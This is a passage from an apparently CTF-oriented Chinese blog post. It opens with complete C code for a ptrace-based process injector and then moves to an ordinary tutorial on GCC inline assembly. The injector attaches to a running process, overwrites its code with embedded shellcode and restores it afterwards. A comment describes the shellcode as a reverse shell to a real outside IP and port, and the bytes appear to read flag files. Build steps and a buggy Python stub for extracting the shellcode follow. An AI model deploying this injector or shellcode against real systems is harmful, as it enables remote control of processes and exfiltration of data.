class="type">int</span> r14;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r13;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r12;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r11;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r10;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r9;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r8;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rcx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> orig_rax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ss;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs_base;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs_base;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ds;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> es;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRACE_ATTACH 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRACE_DETACH 17</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRACE_GETREGS 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRACE_SETREGS 13</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRACE_PEEKDATA 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRACE_POKEDATA 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRACE_CONT 7</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRACE_INTERRUPT 0x4207</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -nostdlib -o test test.c -static -T ./link.lds -Os -w -Wl,-gc-sections &amp;&amp; strip ./test</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">run2</span><span class="params">(<span class="type">int</span> child, <span class="type">int</span> has_attach)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> res;</span><br><span class="line">	<span class="keyword">if</span>(!has_attach) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ptrace(PTRACE_ATTACH, child, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			die(<span class="string">&quot;PTRACE_ATTACH&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> status;</span><br><span class="line">	waitpid(child, &amp;status, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">// 保存当前状态</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">save_pt_reg</span>;</span></span><br><span class="line">	<span class="comment">// 保存被覆盖的 shellcode</span></span><br><span class="line">	<span class="meta">#<span class="keyword">define</span> CODE_LEN 300</span></span><br><span class="line">	<span class="comment">// 反弹 shell 给 120.25.122.195 15680</span></span><br><span class="line">	u8 buf[<span class="number">0x400</span>] = &#123;<span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">106</span>, <span class="number">41</span>, <span class="number">88</span>, <span class="number">106</span>, <span class="number">2</span>, <span class="number">95</span>, <span class="number">106</span>, <span class="number">1</span>, <span class="number">94</span>, <span class="number">153</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">106</span>, <span class="number">41</span>, <span class="number">88</span>, <span class="number">106</span>, <span class="number">2</span>, <span class="number">95</span>, <span class="number">106</span>, <span class="number">1</span>, <span class="number">94</span>, <span class="number">153</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">197</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">121</span>, <span class="number">24</span>, <span class="number">123</span>, <span class="number">194</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">106</span>, <span class="number">42</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">239</span>, <span class="number">106</span>, <span class="number">16</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">103</span>, <span class="number">109</span>, <span class="number">96</span>, <span class="number">102</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">106</span>, <span class="number">2</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">65</span>, <span class="number">186</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">127</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">198</span>, <span class="number">106</span>, <span class="number">40</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">239</span>, <span class="number">153</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">106</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">116</span>, <span class="number">120</span>, <span class="number">80</span>, <span class="number">106</span>, <span class="number">2</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">65</span>, <span class="number">186</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">127</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">198</span>, <span class="number">106</span>, <span class="number">40</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">239</span>, <span class="number">153</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">103</span>, <span class="number">109</span>, <span class="number">96</span>, <span class="number">102</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">106</span>, <span class="number">2</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">65</span>, <span class="number">186</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">127</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">198</span>, <span class="number">106</span>, <span class="number">40</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">239</span>, <span class="number">153</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">121</span>, <span class="number">117</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">102</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">106</span>, <span class="number">2</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">65</span>, <span class="number">186</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">127</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">198</span>, <span class="number">106</span>, <span class="number">40</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">239</span>, <span class="number">153</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">239</span>, <span class="number">106</span>, <span class="number">3</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">204</span>&#125;;</span><br><span class="line"></span><br><span class="line">	uint save_opcode[CODE_LEN/<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	uint *opcode = (uint *)buf;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取寄存器</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_GETREGS, child, <span class="literal">NULL</span>, &amp;save_pt_reg) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		die(<span class="string">&quot;PTRACE_GETREGS&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// printf(&quot;GET RIP: 0x%lx\n&quot;, save_pt_reg.rip);</span></span><br><span class="line">	<span class="comment">// 保存原有的 opcode</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; CODE_LEN / <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		save_opcode[i] = ptrace(PTRACE_PEEKDATA, child, save_pt_reg.rip + i*<span class="number">4</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;save!&quot;</span>);</span><br><span class="line">	<span class="comment">// 注入 shellcode</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; CODE_LEN / <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (ptrace(PTRACE_POKEDATA, child, save_pt_reg.rip + i*<span class="number">4</span>, opcode[i]) &lt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			die(<span class="string">&quot;PTRACE_POKEDATA 1&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// // 继续走</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_CONT, child, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		die(<span class="string">&quot;PTRACE_CONT 1&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;inject!&quot;</span>);</span><br><span class="line">	waitpid(child, &amp;status, <span class="number">0</span>);</span><br><span class="line">    ptrace(PTRACE_INTERRUPT, child, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">// 恢复</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; CODE_LEN / <span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (ptrace(PTRACE_POKEDATA, child, save_pt_reg.rip + i*<span class="number">4</span>, save_opcode[i]) &lt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			die(<span class="string">&quot;PTRACE_POKEDATA 2&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_SETREGS, child, <span class="literal">NULL</span>, &amp;save_pt_reg) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		die(<span class="string">&quot;PTRACE_SETREGS&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_CONT, child, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		die(<span class="string">&quot;PTRACE_CONT 2&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;recover!&quot;</span>);</span><br><span class="line">	ptrace(PTRACE_DETACH, child, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;detach!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _start()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 第一个参数是 pid，根据需要修改即可</span></span><br><span class="line">	run2(<span class="number">22093</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="（二）编译"><a href="#（二）编译" class="headerlink" title="（二）编译"></a>（二）编译</h3><p>link.lds</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(_start)</span><br><span class="line"></span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">  . = 0x8048000 + SIZEOF_HEADERS;</span><br><span class="line"></span><br><span class="line">  tiny : &#123; *(.text) *(.data) *(.rodata*) &#125;</span><br><span class="line"></span><br><span class="line">  /DISCARD/ : &#123; *(*) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>编译</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -nostdlib -o <span class="built_in">test</span> test.c -static -T ./link.lds -Os -w -Wl,-gc-sections &amp;&amp; strip ./test</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="（三）python3-剥离-shellcode"><a href="#（三）python3-剥离-shellcode" class="headerlink" title="（三）python3 剥离 shellcode"></a>（三）python3 剥离 shellcode</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">res = os.system(<span class="string">&quot;gcc -nostdlib -o ezshellcode_exp ezshellcode_exp.c -static -T ./link.lds -Os -w -Wl,-gc-sections &amp;&amp; strip ./ezshellcode_exp&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> rer == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">eee = ELF(<span class="string">&quot;./ezshellcode_exp&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">ss = eee.get_section_by_name(<span class="string">&quot;tiny&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="三、C-语言内联汇编"><a href="#三、C-语言内联汇编" class="headerlink" title="三、C 语言内联汇编"></a>三、C 语言内联汇编</h2><h3 id="（一）基本格式"><a href="#（一）基本格式" class="headerlink" title="（一）基本格式"></a>（一）基本格式</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> [<span class="keyword">volatile</span>] ( </span><br><span class="line">    <span class="string">&quot;汇编指令1\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;汇编指令2\n\t&quot;</span></span><br><span class="line">    ...</span><br><span class="line">    : 输出操作数          <span class="comment">// 可选</span></span><br><span class="line">    : 输入操作数          <span class="comment">// 可选</span></span><br><span class="line">    : 被破坏的寄存器/内存  <span class="comment">// 可选</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
+
+<p>或者使用 <code>__asm__</code>（和 <code>asm</code> 完全一样，更显式）：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;汇编指令&quot;</span></span></span><br><span class="line"><span class="params">    : 输出</span></span><br><span class="line"><span class="params">    : 输入</span></span><br><span class="line"><span class="params">    : 破坏</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>关键部分说明：</p>
+<table>
+<thead>
+<tr>
+<th align="left">部分</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>asm</code> 或 <code>__asm__</code></td>
+<td align="left">表示内联汇编代码块的开始</td>
+</tr>
+<tr>
+<td align="left"><code>volatile</code></td>
+<td align="left">（可选）告诉编译器不要优化此段汇编，保证按书写顺序执行</td>
+</tr>
+<tr>
+<td align="left">“汇编指令”</td>
+<td align="left">真正的汇编代码，比如 <code>&quot;movl $1, %eax&quot;</code>，多条指令用 <code>\n\t</code> 分隔</td>
+</tr>
+<tr>
+<td align="left"><strong>输出操作数</strong></td>
+<td align="left">汇编代码 <strong>写入</strong> 的 C 变量，用 <code>&quot;=r&quot;</code> 等约束表示</td>
+</tr>
+<tr>
+<td align="left"><strong>输入操作数</strong></td>
+<td align="left">汇编代码 <strong>读取</strong> 的 C 变量，用 <code>&quot;r&quot;</code> 等约束表示</td>
+</tr>
+<tr>
+<td align="left"><strong>被破坏的部分</strong></td>
+<td align="left">告诉编译器本汇编修改了哪些寄存器或内存，防止优化错误，如 <code>&quot;memory&quot;</code> 或 <code>&quot;eax&quot;</code></td>
+</tr>
+</tbody></table>
+<h3 id="（二）操作数约束说明"><a href="#（二）操作数约束说明" class="headerlink" title="（二）操作数约束说明"></a>（二）操作数约束说明</h3><p>在输入&#x2F;输出操作数中，我们使用 <strong>约束（constraints）</strong> 来告诉编译器如何处理 C 变量。</p>
+<table>
+<thead>
+<tr>
+<th align="left">约束</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>&quot;r&quot;</code></td>
+<td align="left">使用任意通用寄存器</td>
+</tr>
+<tr>
+<td align="left"><code>&quot;m&quot;</code></td>
+<td align="left">操作数是内存地址</td>
+</tr>
+<tr>
+<td align="left"><code>&quot;i&quot;</code></td>
+<td align="left">操作数是立即数（常数）</td>
+</tr>
+<tr>
+<td align="left"><code>&quot;g&quot;</code></td>
+<td align="left">操作数可以是寄存器、内存或立即数</td>
+</tr>
+<tr>
+<td align="left"><code>&quot;=r&quot;</code></td>
+<td align="left">输出操作数（写入到寄存器，然后存入变量）</td>
+</tr>
+<tr>
+<td align="left"><code>&quot;+r&quot;</code></td>
+<td align="left">输入+输出操作数（读写）</td>
+</tr>
+<tr>
+<td align="left"><code>&quot;&amp;&quot;</code></td>
+<td align="left">该操作数是临时寄存器，仅汇编内部使用</td>
+</tr>
+<tr>
+<td align="left"><code>&quot;memory&quot;</code></td>
+<td align="left">告诉编译器本汇编代码修改了内存，防止乱序优化</td>
+</tr>
+<tr>
+<td align="left"><code>&quot;cc&quot;</code></td>
+<td align="left">告诉编译器本汇编修改了标志寄存器（如零标志、进位标志等）</td>
+</tr>
+</tbody></table>
+<h3 id="（三）简单示例：使用输入和输出-——-C-变量与汇编交互"><a href="#（三）简单示例：使用输入和输出-——-C-变量与汇编交互" class="headerlink" title="（三）简单示例：使用输入和输出 —— C 变量与汇编交互"></a>（三）简单示例：使用输入和输出 —— C 变量与汇编交互</h3><h4 id="1、demo：将两个整数相加，使用汇编实现，结果存回-C-变量"><a href="#1、demo：将两个整数相加，使用汇编实现，结果存回-C-变量" class="headerlink" title="1、demo：将两个整数相加，使用汇编实现，结果存回 C 变量"></a>1、demo：将两个整数相加，使用汇编实现，结果存回 C 变量</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;addl %[b_input], %[result_output]&quot;</span>  <span class="comment">// 汇编指令：result = result + b</span></span></span><br><span class="line"><span class="params">        : [result_output] <span class="string">&quot;=r&quot;</span> (result)      <span class="comment">// 输出操作数：result 放入寄存器，再写回变量</span></span></span><br><span class="line"><span class="params">        : [a_input] <span class="string">&quot;r&quot;</span> (a),                 <span class="comment">// 输入操作数 a</span></span></span><br><span class="line"><span class="params">          [b_input] <span class="string">&quot;r&quot;</span> (b),                 <span class="comment">// 输入操作数 b</span></span></span><br><span class="line"><span class="params">          [result_output] <span class="string">&quot;0&quot;</span> (a)            <span class="comment">// result 初始值为 a（可选，这里为了演示）</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更清晰、更常用的写法如下：</span></span><br><span class="line">    a = <span class="number">10</span>;</span><br><span class="line">    b = <span class="number">20</span>;</span><br><span class="line">    result = a;  <span class="comment">// 先让 result = a</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;addl %[b_val], %[result_val]&quot;</span></span></span><br><span class="line"><span class="params">        : [result_val] <span class="string">&quot;=r&quot;</span> (result)</span></span><br><span class="line"><span class="params">        : [b_val] <span class="string">&quot;r&quot;</span> (b), [result_val] <span class="string">&quot;0&quot;</span> (result)</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最推荐的标准、易读写法：</span></span><br><span class="line">    a = <span class="number">10</span>;</span><br><span class="line">    b = <span class="number">20</span>;</span><br><span class="line">    result = a;  <span class="comment">// result = 10</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;addl %[b], %[result]&quot;</span></span></span><br><span class="line"><span class="params">        : [result] <span class="string">&quot;=r&quot;</span> (result)</span></span><br><span class="line"><span class="params">        : [b] <span class="string">&quot;r&quot;</span> (b), [result] <span class="string">&quot;0&quot;</span> (result)</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result = %d\n&quot;</span>, result);  <span class="comment">// 输出 30</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<table>
+<thead>
+<tr>
+<th align="left">部分</th>
+<th align="left">说明</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>汇编指令</strong></td>
+<td align="left">要执行的汇编代码，如 <code>&quot;movl $1, %eax&quot;</code></td>
+<td align="left"><code>&quot;addl %[b], %[result]&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><strong>输出操作数</strong></td>
+<td align="left">汇编代码写入的 C 变量，格式：<code>[name] &quot;约束&quot; (变量)</code></td>
+<td align="left"><code>[result] &quot;=r&quot; (result)</code></td>
+</tr>
+<tr>
+<td align="left"><strong>输入操作数</strong></td>
+<td align="left">汇编代码读取的 C 变量，格式同上</td>
+<td align="left"><code>[b] &quot;r&quot; (b)</code></td>
+</tr>
+<tr>
+<td align="left"><strong>被破坏部分</strong></td>
+<td align="left">告诉编译器哪些寄存器&#x2F;内存被修改了，如 <code>&quot;memory&quot;</code>、<code>&quot;eax&quot;</code></td>
+<td align="left"><code>&quot;memory&quot;</code></td>
+</tr>
+</tbody></table>
+<h4 id="2、demo：读取内存地址-rsp-0x8-的值（x86-64）"><a href="#2、demo：读取内存地址-rsp-0x8-的值（x86-64）" class="headerlink" title="2、demo：读取内存地址 [rsp + 0x8] 的值（x86_64）"></a>2、demo：读取内存地址 <code>[rsp + 0x8]</code> 的值（x86_64）</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;movq 0x8(%%rsp), %[val]&quot;</span>   